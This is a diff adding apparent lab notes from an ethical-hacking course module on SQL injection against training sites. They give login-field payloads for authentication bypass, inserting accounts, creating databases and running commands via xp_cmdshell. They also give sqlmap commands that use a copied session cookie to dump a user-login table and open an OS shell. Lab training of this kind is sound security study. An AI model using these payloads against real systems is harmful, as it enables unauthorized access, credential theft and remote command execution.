@@ -1,0 +1,37 @@
+Module 15: SQL Injection
+
+SQL Injection Attacks on an MS SQL Database
+	In Windows 2012, http://www.goodshopping.com Login
+	u: blah' or 1=1 --
+	 
+	Windows Server 2016, Microsoft SQL Server Management Studio (Windows Authentication)
+	Databases --> GoodShopping --> Tables
+	right-click dbo.Login and click Select Top 1000 Rows
+	
+	In Windows 2012, http://www.goodshopping.com Login
+	u: blah';insert into login values ('john','apple123'); --
+	Verify login. Check in dbo.Login table as well.
+	
+	In Windows 2012, http://www.goodshopping.com Login
+	u: blah';create database mydatabase; --
+	Windows Server 2016, Check Microsoft SQL Server Management Studio for new database.
+	
+	In Windows 2012, http://www.goodshopping.com Login
+	u: blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
+	Windows Server 2016, Task Manager, Check ping.exe running.
+	
+Scanning Web Applications Using N-Stalker Tool
+	Windows Server 2016, N-Stalker Free X
+	http://www.goodshopping.com, OWASP Policy
+
+Performing SQL Injection attack against MSSQL to extract Databases and WebShell using SQLMAP
+	In Kali Linux, login to http://www.moviescope.com with available user login. View Profile.
+	Inspect Element >  Console tab > type document.cookie > copy cookie value
+	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” -- cookie=<”cookie value which you have copied”> --dbs
+	To get tables db moviescope, sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value”> -D moviescope --tables
+	To get columns of table User_Login, sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value”> -D moviescope -T User_Login --columns
+	To dump table User_Login, sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value”> -D moviescope -T User_Login --dump
+	To gain OS shell, sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value”> --os-shell
+	optimize value(s) for DBMS delay responses - Y
+	hostname
+	ipconfig
